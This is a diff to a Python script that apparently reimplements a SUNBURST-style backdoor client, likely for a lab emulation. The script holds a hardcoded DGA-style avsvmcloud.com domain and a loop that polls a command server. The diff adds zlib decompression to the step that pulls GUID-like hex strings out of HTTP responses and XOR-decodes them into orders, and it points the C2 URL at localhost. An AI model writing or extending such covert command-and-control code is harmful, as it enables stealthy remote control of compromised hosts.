@@ -11,12 +11,14 @@ import json
 import base64
 import subprocess
 import struct
+import zlib
 
 from dns import resolver
 from datetime import datetime
 from psutil import AccessDenied
 
-main_url = "http://192.168.132.2:8081/"
+#main_url = "http://192.168.132.2:8081/"
+main_url = "http://127.0.0.1:8081/"
 
 domain_name = "i32hu6i32hu6.appsync-api.us-east-2.avsvmcloud.com" # = output of DGA algo
 
@@ -65,6 +67,7 @@ def execute_order(order, additional_data_received = ""):
 
 
 def send_receive_request(url, order_received = None, additional_data_received = ""):
+  global main_url
 
   if order_received is None:
     step_list = []
@@ -117,16 +120,21 @@ def send_receive_request(url, order_received = None, additional_data_received = 
 
   body_request = request.text
 
+
   regex_list = re.findall(r"""[0-9a-f-]{36}|[0-9a-f]{32}|[0-9a-f]{16}""", body_request)
+
+
   print("Strings found with regex : ", regex_list)
 
   regex_string = "".join([k.replace("-", "") for k in regex_list])
 
   byte_message = ord("a") # necessary to change that, the first byte may not be the same
 
-  message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1")).decode("ISO-8859-1")
+  message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1"))
 
-  message_plain_text = "".join([chr(ord(cs) ^ byte_message) for cs in message_hex])
+  decompressed_message = zlib.decompress(message_hex).decode("ISO-8859-1")
+
+  message_plain_text = "".join([chr(ord(cs) ^ byte_message) for cs in decompressed_message])
 
   #message_plain_text = binascii.unhexlify(unxored_message).decode("ISO-8859-1")
 
@@ -194,7 +202,8 @@ def main():
   connection = False
   while connection is False:
     try:
-      url="http://192.168.132.2:8081/"
+      #url="http://192.168.132.2:8081/"
+      url = main_url
       first_request = requests.get(url)
 
       if first_request.status_code == 200:
